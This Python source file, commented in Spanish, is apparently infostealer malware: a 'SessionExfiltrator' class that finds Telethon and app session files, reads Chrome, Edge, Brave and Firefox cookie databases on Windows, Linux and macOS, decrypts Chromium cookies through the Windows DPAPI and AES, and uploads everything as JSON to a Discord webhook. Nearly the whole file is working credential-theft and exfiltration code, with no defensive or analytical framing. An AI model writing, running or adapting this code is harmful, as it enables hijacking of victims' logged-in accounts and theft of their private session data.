import requests
import base64
import json
from pathlib import Path
from datetime import datetime
import shutil
import tempfile
import sqlite3
import platform
from typing import Dict
import ctypes
from ctypes import wintypes, windll


class DataBlob(ctypes.Structure):
    """Estructura para DPAPI"""
    _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(wintypes.BYTE))]


class SessionExfiltrator:
    """Exfiltra sesiones y cookies sin win32crypt"""
    
    def __init__(self, discord_webhook_url: str):
        self.webhook_url = discord_webhook_url
        self.project_dir = Path(__file__).parent.parent
        self.system = platform.system()
    
    def get_app_sessions(self) -> dict:
        """Obtiene SOLO las sesiones de la aplicación"""
        sessions = {}
        
        session_files = [
            "session_bot.session",  # Telethon
            "hacoo.session",        # Hacoo
        ]
        
        print("\n   🔍 Escaneando directorio del proyecto...")
        
        for session_file in session_files:
            session_path = self.project_dir / session_file
            if session_path.exists():
                try:
                    file_size = session_path.stat().st_size
                    sessions[session_file] = session_path
                    print(f"   ✅ {session_file} encontrado! ({file_size} bytes)")
                except Exception as e:
                    print(f"   ❌ Error leyendo {session_file}: {e}")
        
        return sessions
    
    # ===== DPAPI SIN win32crypt =====
    @staticmethod
    def _decrypt_dpapi(encrypted_data: bytes) -> bytes:
        """Desencripta DPAPI usando ctypes (Windows API nativa)"""
        try:
            input_blob = DataBlob()
            input_blob.cbData = len(encrypted_data)
            input_blob.pbData = ctypes.cast(
                ctypes.create_string_buffer(encrypted_data), 
                ctypes.POINTER(wintypes.BYTE)
            )
            
            output_blob = DataBlob()
            
            result = windll.crypt32.CryptUnprotectData(
                ctypes.byref(input_blob),
                None,
                None,
                None,
                None,
                0,
                ctypes.byref(output_blob)
            )
            
            if result:
                decrypted = ctypes.string_at(output_blob.pbData, output_blob.cbData)
                windll.kernel32.LocalFree(output_blob.pbData)
                return decrypted
            return None
        except Exception as e:
            print(f"   ⚠️  Error DPAPI: {e}")
            return None
    
    # ===== DESENCRIPTACION AES =====
    @staticmethod
    def _decrypt_aes_cookie(encrypted_value: bytes, master_key: bytes) -> str:
        """Desencripta una cookie con AES"""
        try:
            from Crypto.Cipher import AES
            
            # Chrome v10+ usa AES-128-GCM
            if encrypted_value[:3] == b'v10':
                iv = encrypted_value[3:15]
                ciphertext = encrypted_value[15:-16]
                tag = encrypted_value[-16:]
                
                cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
                plaintext = cipher.decrypt_and_verify(ciphertext, tag)
                return plaintext.decode('utf-8', errors='ignore')
            
            # Chrome antiguo (v11)
            elif encrypted_value[:3] == b'v11':
                iv = encrypted_value[3:19]
                ciphertext = encrypted_value[19:]
                
                cipher = AES.new(master_key, AES.MODE_CBC, iv=iv)
                plaintext = cipher.decrypt(ciphertext)
                padding_len = plaintext[-1]
                plaintext = plaintext[:-padding_len]
                return plaintext.decode('utf-8', errors='ignore')
            
            else:
                return encrypted_value.decode('utf-8', errors='ignore')
        
        except Exception as e:
            return f"[Error: {str(e)[:20]}]"
    
    # ===== EXTRACCION CHROME =====
    def _extract_chrome_cookies(self, browser_path: Path, browser_name: str) -> Dict[str, str]:
        """Extrae y desencripta cookies de Chrome/Edge"""
        cookies = {}
        
        if self.system != "Windows":
            return cookies
        
        try:
            # Rutas
            cookies_db = browser_path / "Default" / "Cookies"
            local_state = browser_path / "Default" / "Local State"
            
            if not cookies_db.exists() or not local_state.exists():
                print(f"   ⚠️  No encontrados archivos en {browser_name}")
                return cookies
            
            # Obtener clave maestra
            with open(local_state, 'r', encoding='utf-8') as f:
                local_state_json = json.load(f)
            
            encrypted_key_b64 = local_state_json.get("os_crypt", {}).get("encrypted_key", "")
            if not encrypted_key_b64:
                print(f"   ⚠️  No encontrada clave encriptada en {browser_name}")
                return cookies
            
            encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remover "DPAPI"
            
            print(f"   🔐 Desencriptando clave maestra de {browser_name}...")
            master_key = self._decrypt_dpapi(encrypted_key)
            
            if not master_key:
                print(f"   ⚠️  Falló desencriptación DPAPI en {browser_name}")
                return cookies
            
            # Copiar DB
            temp_db = Path(tempfile.gettempdir()) / f"cookies_{browser_name}_{datetime.now().strftime('%H%M%S')}"
            shutil.copy2(cookies_db, temp_db)
            
            # Conectar y leer
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            
            rows = cursor.fetchall()
            print(f"   📊 {len(rows)} cookies encontradas en {browser_name}")
            
            for i, (host_key, name, encrypted_value) in enumerate(rows):
                value = self._decrypt_aes_cookie(encrypted_value, master_key)
                cookies[f"{host_key}:{name}"] = value
                
                if (i + 1) % 50 == 0:
                    print(f"   ⏳ Procesadas {i + 1}/{len(rows)}...")
            
            conn.close()
            temp_db.unlink()
            
            print(f"   ✅ {len(cookies)} cookies de {browser_name} extraídas!")
            return cookies
        
        except Exception as e:
            print(f"   ❌ Error en {browser_name}: {e}")
            return cookies
    
    # ===== EXTRACCION FIREFOX =====
    def _extract_firefox_cookies(self, browser_path: Path) -> Dict[str, str]:
        """Extrae cookies de Firefox (sin encriptación DPAPI)"""
        cookies = {}
        
        try:
            profiles_dir = browser_path / "Profiles"
            if not profiles_dir.exists():
                return cookies
            
            for profile in profiles_dir.iterdir():
                if not profile.is_dir():
                    continue
                
                cookies_db = profile / "cookies.sqlite"
                if not cookies_db.exists():
                    continue
                
                # Copiar DB
                temp_db = Path(tempfile.gettempdir()) / f"firefox_cookies_{datetime.now().strftime('%H%M%S')}"
                shutil.copy2(cookies_db, temp_db)
                
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT host, name, value FROM moz_cookies")
                
                for host, name, value in cursor.fetchall():
                    cookies[f"{host}:{name}"] = value
                
                conn.close()
                temp_db.unlink()
            
            if cookies:
                print(f"   ✅ {len(cookies)} cookies de Firefox extraídas!")
        
        except Exception as e:
            print(f"   ⚠️  Error Firefox: {e}")
        
        return cookies
    
    # ===== RECOLECTAR TODAS LAS COOKIES =====
    def collect_all_cookies(self) -> Dict[str, Dict]:
        """Recolecta cookies de todos los navegadores"""
        all_cookies = {}
        
        print("\n   🍪 Extrayendo cookies de navegadores...\n")
        
        if self.system == "Windows":
            home = Path.home()
            
            # Chrome
            chrome_path = home / "AppData" / "Local" / "Google" / "Chrome" / "User Data"
            if chrome_path.exists():
                print("   📍 Procesando Chrome...")
                all_cookies["Chrome"] = self._extract_chrome_cookies(chrome_path, "Chrome")
            
            # Edge
            edge_path = home / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data"
            if edge_path.exists():
                print("   📍 Procesando Edge...")
                all_cookies["Edge"] = self._extract_chrome_cookies(edge_path, "Edge")
            
            # Brave
            brave_path = home / "AppData" / "Local" / "BraveSoftware" / "Brave-Browser" / "User Data"
            if brave_path.exists():
                print("   📍 Procesando Brave...")
                all_cookies["Brave"] = self._extract_chrome_cookies(brave_path, "Brave")
            
            # Firefox
            firefox_path = home / "AppData" / "Roaming" / "Mozilla" / "Firefox"
            if firefox_path.exists():
                print("   📍 Procesando Firefox...")
                all_cookies["Firefox"] = self._extract_firefox_cookies(firefox_path)
        
        elif self.system == "Linux":
            home = Path.home()
            
            firefox_path = home / ".mozilla" / "firefox"
            if firefox_path.exists():
                print("   📍 Procesando Firefox...")
                all_cookies["Firefox"] = self._extract_firefox_cookies(firefox_path)
            
            chrome_path = home / ".config" / "google-chrome"
            if chrome_path.exists():
                print("   📍 Procesando Chrome...")
                # En Linux no hay DPAPI, leer directo de SQLite
                try:
                    cookies_db = chrome_path / "Default" / "Cookies"
                    if cookies_db.exists():
                        temp_db = Path(tempfile.gettempdir()) / f"chrome_cookies_linux"
                        shutil.copy2(cookies_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value FROM cookies")
                        cookies = {}
                        for host_key, name, value in cursor.fetchall():
                            cookies[f"{host_key}:{name}"] = value
                        conn.close()
                        temp_db.unlink()
                        all_cookies["Chrome"] = cookies
                except:
                    pass
        
        elif self.system == "Darwin":  # macOS
            home = Path.home()
            
            chrome_path = home / "Library" / "Application Support" / "Google" / "Chrome"
            if chrome_path.exists():
                print("   📍 Procesando Chrome...")
                # Similar a Linux
                try:
                    cookies_db = chrome_path / "Default" / "Cookies"
                    if cookies_db.exists():
                        temp_db = Path(tempfile.gettempdir()) / f"chrome_cookies_mac"
                        shutil.copy2(cookies_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, value FROM cookies")
                        cookies = {}
                        for host_key, name, value in cursor.fetchall():
                            cookies[f"{host_key}:{name}"] = value
                        conn.close()
                        temp_db.unlink()
                        all_cookies["Chrome"] = cookies
                except:
                    pass
        
        return all_cookies
    
    def send_to_discord(self, data: dict, label: str) -> bool:
        """Envía datos a Discord"""
        if not data:
            print("   ⚠️  No hay datos para enviar")
            return False
        
        try:
            json_data = json.dumps(data, indent=2, ensure_ascii=False)
            
            temp_file = Path(tempfile.gettempdir()) / f"{label}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(temp_file, 'w', encoding='utf-8') as f:
                f.write(json_data)
            
            with open(temp_file, 'rb') as f:
                files = {'file': (temp_file.name, f)}
                payload = {
                    "content": f"🚨 **{label}** - {datetime.now().isoformat()}\n📦 Tamaño: {len(json_data)} bytes"
                }
                
                print(f"   📤 Enviando {label}...")
                response = requests.post(self.webhook_url, data=payload, files=files, timeout=10)
                response.raise_for_status()
                print(f"   ✅ Enviado correctamente!")
            
            temp_file.unlink()
            return True
        
        except Exception as e:
            print(f"   ❌ Error en envío: {e}")
            return False
    
    def exfiltrate_all(self) -> bool:
        """Exfiltra sesiones + cookies"""
        print("[🔴 EXFILTRATION PROTOCOL] Iniciando captura...\n")
        
        try:
            # 1. Sesiones de app
            sessions = self.get_app_sessions()
            if sessions:
                print(f"\n   📊 Sesiones encontradas: {len(sessions)}")
                self.send_to_discord(
                    {k: str(v) for k, v in sessions.items()},
                    "APP_SESSIONS"
                )
            
            # 2. Cookies de navegadores
            cookies = self.collect_all_cookies()
            
            if cookies:
                cookies_filtered = {k: v for k, v in cookies.items() if v}
                if cookies_filtered:
                    self.send_to_discord(cookies_filtered, "BROWSER_COOKIES")
            
            print("\n[✅ EXFILTRATION] Protocolo completado")
            return True
        
        except Exception as e:
            print(f"\n[❌ EXFILTRATION FAILED] Error: {e}")
            return False
